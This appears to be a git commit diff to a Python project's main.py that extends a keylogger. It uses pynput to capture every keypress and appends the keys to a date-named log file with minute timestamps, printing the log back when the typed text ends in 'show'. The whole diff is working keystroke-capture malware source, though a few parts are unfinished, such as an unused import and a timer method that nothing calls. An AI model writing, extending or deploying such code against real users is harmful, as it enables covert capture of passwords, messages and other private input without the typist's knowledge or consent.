8fa06066e268dc6c86584e31cd2dd56b5efff814
jacobsun211 <jacobsun211@gmail.com>
2025-09-02 12:31:12 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,15 @@
+from multiprocessing.connection import Listener
+from time import sleep
 from pynput import keyboard
-import time
+from datetime import datetime
+import threading
 
+file_name = f"logs/{datetime.now().strftime("%d-%m-%Y")}.txt"
+current_time = datetime.now().strftime("%d/%m/%Y %H:%M")
+
+print(current_time)
+with open(file_name, "w") as file:
+    file.write("\n***** " + current_time + " *****\n")
 
 class IKeylogger:
     def __init__(self):
@@ -19,9 +28,7 @@ class IKeylogger:
                 tempKey = '\n'
             elif tempKey == keyboard.Key.space:
                 tempKey = " "
-            else:
-                tempKey = str(tempKey)
-        self.my_list.append(tempKey)
+        AddToFile.add_to_file(tempKey)
 
     def start_logging(self):
         self.Listener = keyboard.Listener(on_press= self.on_press)
@@ -33,4 +40,25 @@ class IKeylogger:
     def get_logged_keys(self):
         return "".join(self.my_list)
 
-print(5)
+
+class AddToFile():
+    def add_to_file(tempKey):
+       global current_time
+       tempTime = datetime.now().strftime("%d/%m/%Y %H:%M")
+       if tempTime != current_time:
+           with open(file_name, "a") as file:
+               file.write("\n***** " + tempTime + " *****\n")
+               current_time = tempTime
+       with open(file_name, "a") as file:
+           file.write(str(tempKey))
+       data = ''
+       with open(file_name, "r") as f:
+           data = f.read()
+       if data[-4:] == "show":
+           print("\n"+data[:-4:])
+
+    def write_time(self):
+        with open(file_name, "a") as file:
+            file.write("\n" + datetime.now().strftime("%d/%m/%Y %H:%M:%S") + "\n")
+
+        threading.Timer(5, self.write_time).start()
